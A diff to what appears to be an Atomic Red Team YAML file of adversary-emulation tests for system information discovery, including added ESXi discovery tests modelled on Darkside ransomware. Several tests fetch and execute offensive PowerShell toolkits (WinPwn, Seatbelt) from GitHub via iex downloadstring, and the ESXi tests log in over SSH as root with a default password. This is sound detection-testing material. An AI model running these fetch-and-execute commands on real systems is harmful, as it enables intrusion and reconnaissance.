@@ -58,7 +58,7 @@ atomic_tests:
     command: |
       if [ -f /sys/class/dmi/id/bios_version ]; then cat /sys/class/dmi/id/bios_version | grep -i amazon; fi
       if [ -f /sys/class/dmi/id/product_name ]; then cat /sys/class/dmi/id/product_name | grep -i "Droplet\|HVM\|VirtualBox\|VMware"; fi
-      if [ -f /sys/class/dmi/id/product_name ]; then cat /sys/class/dmi/id/chassis_vendor | grep -i "Xen\|Bochs\|QEMU"; fi
+      if [ -f /sys/class/dmi/id/chassis_vendor ]; then cat /sys/class/dmi/id/chassis_vendor | grep -i "Xen\|Bochs\|QEMU"; fi
       if [ -x "$(command -v dmidecode)" ]; then sudo dmidecode | grep -i "microsoft\|vmware\|virtualbox\|quemu\|domu"; fi
       if [ -f /proc/scsi/scsi ]; then cat /proc/scsi/scsi | grep -i "vmware\|vbox"; fi
       if [ -f /proc/ide/hd0/model ]; then cat /proc/ide/hd0/model | grep -i "vmware\|vbox\|qemu\|virtual"; fi
@@ -79,6 +79,7 @@ atomic_tests:
       sudo lsmod | grep -i "virtio_pci\|virtio_net"
       sudo lsmod | grep -i "hv_vmbus\|hv_blkvsc\|hv_netvsc\|hv_utils\|hv_storvsc"
     name: bash
+    elevation_required: true
 - name: FreeBSD VM Check via Kernel Modules
   auto_generated_guid: eefe6a49-d88b-41d8-8fc2-b46822da90d3
   description: |
@@ -186,7 +187,6 @@ atomic_tests:
   - windows
   executor:
     command: |-
-      $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
       iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
       winPEAS -noninteractive -consoleoutput
     name: powershell
@@ -197,7 +197,6 @@ atomic_tests:
   - windows
   executor:
     command: |-
-      $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
       iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
       itm4nprivesc -noninteractive -consoleoutput
     name: powershell
@@ -208,7 +207,6 @@ atomic_tests:
   - windows
   executor:
     command: |-
-      $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
       iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
       oldchecks -noninteractive -consoleoutput
     cleanup_command: |-
@@ -225,7 +223,6 @@ atomic_tests:
   - windows
   executor:
     command: |-
-      $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
       iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
       otherchecks -noninteractive -consoleoutput
     name: powershell
@@ -236,7 +233,6 @@ atomic_tests:
   - windows
   executor:
     command: |-
-      $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
       iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
       Generalrecon -consoleoutput -noninteractive
     name: powershell
@@ -247,7 +243,6 @@ atomic_tests:
   - windows
   executor:
     command: |-
-      $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
       iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
       Morerecon -noninteractive -consoleoutput
     name: powershell
@@ -258,7 +253,6 @@ atomic_tests:
   - windows
   executor:
     command: |-
-      $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
       iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
       RBCD-Check -consoleoutput -noninteractive
     name: powershell
@@ -295,7 +289,7 @@ atomic_tests:
   executor:
     command: |-
       iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Seatbelt.ps1')
-      Invoke-Seatbelt -Command "-group=all"; pause
+      Invoke-Seatbelt -Command "-group=all"
     name: powershell
 - name: Azure Security Scan with SkyArk
   auto_generated_guid: 26a18d3d-f8bc-486b-9a33-d6df5d78a594
@@ -397,20 +391,7 @@ atomic_tests:
       wmic DISKDRIVE get Caption
       Get-WmiObject win32_bios
     name: command_prompt
-- name: Driver Enumeration using DriverQuery
-  auto_generated_guid: bd85e3d1-4aeb-4a1d-850f-7be3cb8d60b9
-  description: |
-    Executes the driverquery command to list drivers installed on the system. Adversaries utilize the feature to enumerate the driver and it can be
-    used for Exploitation. 
-    command /v - provide verbose output but not valid for signed drivers
-            /si - provide information about signed drivers 
-  supported_platforms:
-  - windows
-  executor:
-    command: |
-      driverquery /v
-      driverquery /si
-    name: command_prompt
+
 - name: System Information Discovery
   auto_generated_guid: 4060ee98-01ae-4c8e-8aad-af8300519cc7
   description: |
@@ -446,3 +427,172 @@ atomic_tests:
       reg query HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System /v SystemBiosVersion
       reg query HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System /v VideoBiosVersion
     name: command_prompt
+- name: ESXi - VM Discovery using ESXCLI
+  auto_generated_guid: 2040405c-eea6-4c1c-aef3-c2acc430fac9
+  description: |
+    An adversary will using ESXCLI to enumerate the Virtual Machines on the host prior to executing power off routine.
+    [Reference](https://www.crowdstrike.com/blog/hypervisor-jackpotting-ecrime-actors-increase-targeting-of-esxi-servers/)
+  supported_platforms:
+  - windows
+  input_arguments:
+    vm_host:
+      description: Specify the host name or IP of the ESXi Server
+      type: string
+      default: atomic.local
+    vm_user:
+      description: Specify the privilege user account on ESXi Server
+      type: string
+      default: root
+    vm_pass:
+      description: Specify the privilege user password on ESXi Server
+      type: string
+      default: pass
+    plink_file:
+      description: Path to Plink
+      type: path
+      default: 'PathToAtomicsFolder\..\ExternalPayloads\plink.exe'
+    cli_script:
+      description: Path to file with discovery commands
+      type: path
+      default: PathToAtomicsFolder\T1082\src\esx_vmdiscovery.txt
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      Check if plink is available.
+    prereq_command: |
+      if (Test-Path "#{plink_file}") {exit 0} else {exit 1}
+    get_prereq_command: |
+      New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+      Invoke-WebRequest "https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe" -OutFile "#{plink_file}"
+  executor:
+    command: |
+       echo "" | "#{plink_file}" "#{vm_host}" -ssh  -l "#{vm_user}" -pw "#{vm_pass}" -m "#{cli_script}"
+    name: command_prompt
+    elevation_required: false
+- name: ESXi - Darkside system information discovery
+  auto_generated_guid: f89812e5-67d1-4f49-86fa-cbc6609ea86a
+  description: |
+    Darkside ransomware utilises various ESXCLI commands to obtain information about the ESXi Host.
+    [Reference](https://www.trendmicro.com/en_ph/research/21/e/darkside-linux-vms-targeted.html)
+  supported_platforms:
+  - windows
+  input_arguments:
+    vm_host:
+      description: Specify the host name or IP of the ESXi Server
+      type: string
+      default: atomic.local
+    vm_user:
+      description: Specify the privilege user account on ESXi Server
+      type: string
+      default: root
+    vm_pass:
+      description: Specify the privilege user password on ESXi Server
+      type: string
+      default: pass
+    plink_file:
+      description: Path to Plink
+      type: path
+      default: 'PathToAtomicsFolder\..\ExternalPayloads\plink.exe'
+    cli_script:
+      description: Path to file containing darkside ransomware discovery commands
+      type: path
+      default: PathToAtomicsFolder\T1082\src\esx_darkside_discovery.txt
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      Check if plink is available.
+    prereq_command: |
+      if (Test-Path "#{plink_file}") {exit 0} else {exit 1}
+    get_prereq_command: |
+      New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+      Invoke-WebRequest "https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe" -OutFile "#{plink_file}"
+  executor:
+    command: |
+       echo "" | "#{plink_file}" "#{vm_host}" -ssh  -l "#{vm_user}" -pw "#{vm_pass}" -m "#{cli_script}"
+    name: command_prompt
+    elevation_required: false
+- name: sysctl to gather macOS hardware info
+  auto_generated_guid: c8d40da9-31bd-47da-a497-11ea55d1ef6c
+  description: Gets the macOS hardware information, which can be used to determine whether the target macOS host is running on a physical or virtual machine. sysctl can be used to gather interesting macOS host data, including hardware information, memory size, logical cpu information, etc.
+  supported_platforms:
+  - macos
+  executor:
+    command: sysctl -n hw.model
+    name: sh
+    elevation_required: false
+- name: 'operating system discovery '
+  auto_generated_guid: 70e13ef4-5a74-47e4-9d16-760b41b0e2db
+  description: |-
+    operating system discovery using get-ciminstance
+    https://petri.com/getting-operating-system-information-powershell/
+  supported_platforms:
+  - windows
+  executor:
+    command: Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version, ServicePackMajorVersion, OSArchitecture, CSName, WindowsDirectory | Out-null
+    name: powershell
+    elevation_required: false
+- name: Check OS version via "ver" command
+  auto_generated_guid: f6ecb109-df24-4303-8d85-1987dbae6160
+  description: Ver command shows information about os version.
+  supported_platforms:
+  - windows
+  executor:
+    name: command_prompt
+    command: ver
+- name: Display volume shadow copies with "vssadmin"
+  auto_generated_guid: 7161b085-816a-491f-bab4-d68e974b7995
+  description: The command shows all available volume shadow copies, along with their creation time and location.
+  supported_platforms:
+  - windows
+  executor:
+    name: command_prompt
+    elevation_required: true
+    command: vssadmin.exe list shadows
+- name: Identify System Locale and Regional Settings with PowerShell
+  auto_generated_guid: ce479c1a-e8fa-42b2-812a-96b0f2f4d28a
+  description: |
+    This action demonstrates how an attacker might gather a system's region and language settings using PowerShell, which could aid in profiling 
+    the machine's location and user language preferences. The command outputs system locale details to a temporary file for further analysis.
+  supported_platforms:
+  - windows
+  executor:
+    name: command_prompt
+    command: |
+      powershell.exe -c "Get-Culture | Format-List | Out-File -FilePath %TMP%\a.txt"
+    cleanup_command: |
+      cmd.exe /c del "%TMP%\a.txt"
+    
+- name: Enumerate Available Drives via gdr
+  auto_generated_guid: c187c9bc-4511-40b3-aa10-487b2c70b6a5
+  description: |
+    This test simulates an attacker attempting to list the available drives on the system to gather data about file storage locations.
+  supported_platforms:
+  - windows
+  executor:
+    name: command_prompt
+    command: |
+      powershell.exe -c "gdr -PSProvider 'FileSystem'"
+- name: Discover OS Product Name via Registry
+  auto_generated_guid: be3b5fe3-a575-4fb8-83f6-ad4a68dd5ce7
+  description: |
+    Identify the Operating System Product Name via registry with the reg.exe command.
+    Upon execution, the OS Product Name will be displayed.
+  supported_platforms:
+    - windows
+  executor:
+    command: |
+      reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v ProductName
+    name: command_prompt
+    elevation_required: false
+- name: Discover OS Build Number via Registry
+  auto_generated_guid: acfcd709-0013-4f1e-b9ee-bc1e7bafaaec
+  description: |
+    Identify the Operating System Build Number via registry with the reg.exe command.
+    Upon execution, the OS Build Number will be displayed.
+  supported_platforms:
+    - windows
+  executor:
+    command: |
+      reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v CurrentBuildNumber
+    name: command_prompt
+    elevation_required: false
